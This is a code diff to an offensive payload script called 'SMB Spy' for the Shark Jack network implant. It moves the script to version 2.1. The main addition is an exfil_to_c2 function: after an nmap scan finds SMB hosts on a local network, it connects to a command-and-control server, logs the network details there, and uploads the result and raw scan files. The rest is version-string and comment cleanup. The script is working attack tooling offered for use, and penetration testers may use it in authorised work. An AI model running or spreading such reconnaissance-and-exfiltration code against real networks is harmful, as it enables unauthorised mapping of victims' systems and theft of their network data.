@@ -2,7 +2,7 @@
 # Title: SMB Spy Ported for the Shark Jack Display
 # Author: Hackazillarex
 # Description: Discovers SMB hosts using nmap and logs results with next-step suggestions
-# Version: 2.0 (Shark Jack Display)
+# Version: 2.1 (Shark Jack Display + Cloud C2)
 
 setup_payload() {
   LOOT_BASE="/root/loot/smb_discovery"
@@ -13,6 +13,8 @@ setup_payload() {
   CIDR=""
   SCAN_START=0
   SCAN_END=0
+  ELAPSED=0
+  COUNT=0
   LED SETUP
   mkdir -p "$LOOT_BASE"
 }
@@ -36,7 +38,6 @@ set_netmode_dhcp() {
 }
 
 log_network_info() {
-  # Log gateway, DNS, and our own IP 
   GW=$(ip route | awk '/default/ {print $3}')
   DNS=$(cat /etc/resolv.conf | awk '/nameserver/ {print $2}' | head -1)
   log_both "My IP:   $IPADDR"
@@ -54,6 +55,38 @@ ping_sweep() {
   LOG "Live hosts: $LIVE_HOSTS"
   ALERT "$LIVE_HOSTS live host(s)\nfound on subnet" 2 false
   log_both "Live hosts on subnet: $LIVE_HOSTS"
+}
+
+exfil_to_c2() {
+  ALERT "Sending loot\nto C2..." 1 false
+  CREATE_SPINNER "Uploading..."
+  C2CONNECT 2>/dev/null || {
+    STOP_SPINNER
+    ALERT "C2 unavailable\nLoot saved locally" 2 false
+    log_both "C2 unavailable - loot saved locally only"
+    return
+  }
+  CLOUDLOG "==========================================" 2>/dev/null || true
+  CLOUDLOG "SMB Spy v2.1 Scan Complete" 2>/dev/null || true
+  CLOUDLOG "Timestamp:    $TS" 2>/dev/null || true
+  CLOUDLOG "Network:      $CIDR" 2>/dev/null || true
+  CLOUDLOG "My IP:        $IPADDR" 2>/dev/null || true
+  CLOUDLOG "Live Hosts:   $LIVE_HOSTS" 2>/dev/null || true
+  CLOUDLOG "SMB Hosts:    $COUNT" 2>/dev/null || true
+  CLOUDLOG "Duration:     ${ELAPSED}s" 2>/dev/null || true
+  if [ "$COUNT" -gt 0 ]; then
+    CLOUDLOG "------------------------------------------" 2>/dev/null || true
+    CLOUDLOG "SMB HOSTS FOUND:" 2>/dev/null || true
+    for ip in "${SMB_IPS[@]}"; do
+      CLOUDLOG "  $ip" 2>/dev/null || true
+    done
+  fi
+  CLOUDLOG "==========================================" 2>/dev/null || true
+  C2EXFIL STRING "$OUTFILE" "smb_hosts" 2>/dev/null || true
+  C2EXFIL STRING "$RAWFILE" "nmap_raw" 2>/dev/null || true
+  STOP_SPINNER
+  log_both "Loot exfilled to C2"
+  ALERT "Loot uploaded\nto C2!" 2 false
 }
 
 execute_scan() {
@@ -81,15 +114,15 @@ execute_scan() {
     return
   fi
 
-  # Log network context 
-  log_both "=== SMB Spy v2.0 ==="
+  # Log network context
+  log_both "=== SMB Spy v2.1 ==="
   log_both "Timestamp: $TS"
   log_network_info
 
-  # Ping sweep for live host count 
+  # Ping sweep
   ping_sweep
 
-  # Start scan timer 
+  # Start scan timer
   SCAN_START=$(date +%s)
   log_both "Starting SMB discovery scan..."
   ALERT "Scanning:\n$CIDR" 2 false
@@ -109,7 +142,7 @@ execute_scan() {
     SET_PROGRESS $COMPLETE
   done
 
-  # Stop scan timer 
+  # Stop scan timer
   SCAN_END=$(date +%s)
   ELAPSED=$((SCAN_END - SCAN_START))
   log_both "Scan duration: ${ELAPSED}s"
@@ -159,6 +192,11 @@ execute_scan() {
   log_both "Loot: $OUTFILE"
 
   LED FINISH
+
+  # Exfil to C2
+  COUNT="${#SMB_IPS[@]}"
+  exfil_to_c2
+
   show_scan_summary
 }
 
@@ -210,5 +248,5 @@ view_loot_files() {
 
 setup_payload
 initialize_menu
-ALERT "SMB Spy v2.0\nShark Jack Display\n← to Start" -1 false true
+ALERT "SMB Spy v2.1\nShark Jack\nDisplay\nby\nHackazillarex\n ← to Start" -1 false true
 START_MENU
